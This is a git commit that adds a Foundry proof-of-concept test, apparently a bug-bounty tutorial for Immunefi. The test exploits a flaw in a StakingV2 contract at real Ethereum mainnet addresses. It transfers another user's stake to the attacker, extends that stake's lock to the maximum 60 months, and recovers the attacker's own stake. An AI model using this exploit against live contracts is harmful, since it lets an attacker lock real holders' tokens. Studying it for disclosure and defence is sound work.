2a54e82291877eaff797acbf176b503946d4dd76
SergeKireev <skireev@mediarithmics.com>
2022-07-13 18:01:16 +0200

    Adapt ContractTest to enact the vulnerability
    - Change the way of dealing the tokens into the foundry native way which
      is shorter
    - Remove api keys from the code (They are still here in the code history)

---
+++ README.md
@@ -0,0 +1,6 @@
+# Tutorial PoC for Immunefi part II
+
+Please run using 
+```
+forge test -vvvv --fork-url https://eth-mainnet.alchemyapi.io/v2/{your_alchemy_api_key} --fork-block-number 14811771
+```
--- test/Contract.t.sol
+++ test/Contract.t.sol
@@ -10,28 +10,43 @@ contract ContractTest is Test {
 
     IERC20 yopToken = IERC20(0xAE1eaAE3F627AAca434127644371b67B18444051);
     StakingV2 staking = StakingV2(0x5B705d7c6362A73fD56D5bCedF09f4E40C2d3670);
-    address attacker = address(1);
-
-    function writeTokenBalance(
-        address who,
-        IERC20 token,
-        uint256 amt
-    ) internal {
-        stdstore
-            .target(address(token))
-            .sig(token.balanceOf.selector)
-            .with_key(who)
-            .checked_write(amt);
-    }
+    address attacker1 = address(1);
+    uint8 MAX_STAKE_DURATION_MONTHS = 60;
+    uint256 public constant SECONDS_PER_MONTH = 2629743; // 1 month/30.44 days
 
     function setUp() public {
-        writeTokenBalance(attacker, yopToken, 500 ether);
+        deal(address(yopToken), attacker1, 500 ether);
     }
 
-    function testExample() public {
-        vm.startPrank(attacker);
+    function testYopMaliciousLocking() public {
+        //Impersonate attacker1 for subsequent calls to contracts
+        startHoax(attacker1);
         uint8 lock_duration_months = 1;
+        uint realStakeId = 127;
+        uint additionalAmount = 0;
+
+        //Create a staking position
         yopToken.approve(address(staking), 500 ether);
-        staking.stake(500 ether, lock_duration_months);
+        uint attackerStakeId = staking.stake(500 ether, 1);
+        staking.safeTransferFrom(attacker1, attacker1, realStakeId, additionalAmount, '');
+
+        //The stake with id 127 is locked for 3 months
+        uint8 lockTimeRealStakeId = 3;
+        
+        //We lock the stake for the maximal duration
+        staking.extendStake(
+            realStakeId,
+            MAX_STAKE_DURATION_MONTHS-lockTimeRealStakeId,
+            0,
+            new address[](0)
+        );
+
+        //Attacker has no longer control over his initial stake
+        //But he can use the same vulnerability to transfer it back to himself.
+        staking.safeTransferFrom(attacker1, attacker1, attackerStakeId, additionalAmount, '');
+
+        //Standard cheat for elapsing given time in seconds
+        skip(lock_duration_months*SECONDS_PER_MONTH+1);
+        staking.unstakeSingle(attackerStakeId, attacker1);
     }
 }
